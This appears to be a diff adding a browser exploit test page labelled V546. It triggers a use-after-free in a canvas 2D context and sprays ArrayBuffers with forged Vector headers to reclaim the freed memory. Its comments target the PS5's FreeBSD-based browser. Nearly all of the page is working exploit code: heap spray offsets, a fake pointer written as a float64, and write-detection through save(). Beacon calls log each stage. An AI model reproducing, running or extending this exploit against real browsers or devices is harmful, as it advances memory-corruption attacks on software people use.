@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V546</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V546-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V546-msize1-first');
+
+// T1: Same-type reclaim CONTROL (known working from V530)
+// This MUST go first — it doesn't crash, proves the page works
+(function T1(){
+  b('T1-START','same-type reclaim control');
+  var ctx=triggerUAF();
+  b('T1-UAF','ok');
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  b('T1-RECLAIM','200 contexts created');
+
+  try{
+    var lw=ctx.lineWidth;
+    b('T1-LW','val='+lw);
+  }catch(e){b('T1-LW-ERR',e.message)}
+
+  // Also test save() — see if it crashes (V533 said yes)
+  try{
+    ctx.save();
+    b('T1-SAVE','ok');
+  }catch(e){b('T1-SAVE-ERR',e.message)}
+
+  // Test lineWidth write
+  try{
+    ctx.lineWidth=99999.99;
+    var lw2=ctx.lineWidth;
+    b('T1-LW2','set=99999.99 read='+lw2);
+  }catch(e){b('T1-LW2-ERR',e.message)}
+})();
+
+// T2: AB(768) spray with m_size=1 at offset 124
+// m_buffer at offset 112 = 0x0000000000000000 (NULL)
+// m_capacity at offset 120 = 1
+// m_size at offset 124 = 1
+// Expected: at(0) passes bounds check, then dereferences NULL+48 -> segfault
+// Key question: does this crash DIFFERENTLY than CrashOnOverflow?
+// If we even GET the T2-SPRAY beacon, we know AB spray completed successfully
+(function T2(){
+  b('T2-START','AB spray m_size=1 at off124');
+  var ctx=triggerUAF();
+  b('T2-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // m_stateStack Vector header at offset 112:
+    // +112: m_buffer (8B pointer) = 0 (NULL — will crash)
+    // +120: m_capacity (4B uint32) = 1
+    // +124: m_size (4B uint32) = 1
+    dv.setUint32(120,1,true);  // m_capacity=1
+    dv.setUint32(124,1,true);  // m_size=1
+    abs.push(ab);
+  }
+  b('T2-SPRAY','300 ABs m_size=1');
+
+  // This will crash (NULL dereference) — beacon before attempt
+  b('T2-PRE-LW','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T2-LW','!!!SURVIVED!!! val='+lw);
+  }catch(e){b('T2-LW-ERR',e.message)}
+})();
+
+// T3: AB(768) spray with m_size=1 AND m_buffer = offset 128 area
+// Use a KNOWN mapped address: put a large AB at a separate known location
+// Actually: point m_buffer back into the SAME AB at offset 128
+// For this to work we need to know the AB's address — which we don't.
+// INSTEAD: try m_buffer = small non-zero value to see if it crashes at that addr
+// m_buffer = 0x0000000000001000 (page 1 — might be mapped on FreeBSD)
+(function T3(){
+  b('T3-START','AB spray m_buffer=0x1000');
+  var ctx=triggerUAF();
+  b('T3-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // m_buffer = 0x0000000000001000 (4096)
+    // On PS5 FreeBSD, page 0 is unmapped but page 1 MIGHT be mapped
+    dv.setFloat64(112,2.121995791e-314,false); // 0x0000000000001000 as big-endian float64
+    dv.setUint32(120,1,true);
+    dv.setUint32(124,1,true);
+    abs.push(ab);
+  }
+  b('T3-SPRAY','300 ABs m_buffer=0x1000');
+
+  b('T3-PRE-LW','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T3-LW','!!!SURVIVED!!! val='+lw);
+  }catch(e){b('T3-LW-ERR',e.message)}
+})();
+
+// T4: AB(768) spray with save() detection instead of lineWidth
+// save() just does ++m_unrealizedSaveCount — no pointer deref!
+// m_unrealizedSaveCount is AFTER m_stateStack in the object
+// If we detect a change in our AB data after calling save(), we know:
+// a) AB reclaimed the slot (save() wrote to it)
+// b) The offset where the write landed = m_unrealizedSaveCount offset
+(function T4(){
+  b('T4-START','save() write detection');
+  var ctx=triggerUAF();
+  b('T4-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    // Fill with 0x00 (default) — save() will write 0x01 somewhere
+    abs.push({ab:ab, u8:new Uint8Array(ab)});
+  }
+  b('T4-SPRAY','300 zero ABs');
+
+  // Snapshot before save
+  var snapshots=[];
+  for(var i=0;i<abs.length;i++){
+    snapshots.push(new Uint8Array(abs[i].ab.slice(0)));
+  }
+
+  // Call save() — should write ++m_unrealizedSaveCount somewhere in the AB
+  b('T4-PRE-SAVE','about to call save()');
+  try{
+    ctx.save();
+    b('T4-SAVE','ok - checking for changes');
+  }catch(e){b('T4-SAVE-ERR',e.message)}
+
+  // Compare: find which AB changed and at what offset
+  var found=false;
+  for(var i=0;i<abs.length;i++){
+    for(var j=0;j<768;j++){
+      if(abs[i].u8[j]!==snapshots[i][j]){
+        var diffs=[];
+        for(var jj=Math.max(0,j-4);jj<Math.min(768,j+20);jj++){
+          if(abs[i].u8[jj]!==snapshots[i][jj]){
+            diffs.push('off'+jj+':'+snapshots[i][jj]+'->'+abs[i].u8[jj]);
+          }
+        }
+        b('T4-HIT','AB['+i+'] '+diffs.join(','));
+        found=true;
+        break;
+      }
+    }
+    if(found)break;
+  }
+  if(!found)b('T4-MISS','no AB bytes changed');
+
+  // Call save() again — should increment to 2
+  try{
+    ctx.save();
+    for(var i=0;i<abs.length;i++){
+      for(var j=0;j<768;j++){
+        if(abs[i].u8[j]!==snapshots[i][j]){
+          var diffs=[];
+          for(var jj=Math.max(0,j-4);jj<Math.min(768,j+20);jj++){
+            if(abs[i].u8[jj]!==snapshots[i][jj]){
+              diffs.push('off'+jj+':'+snapshots[i][jj]+'->'+abs[i].u8[jj]);
+            }
+          }
+          b('T4-HIT2','AB['+i+'] after 2nd save: '+diffs.join(','));
+          break;
+        }
+      }
+    }
+  }catch(e){b('T4-SAVE2-ERR',e.message)}
+})();
+
+b('DONE','V546-all-complete');
+</script>
+</body></html>
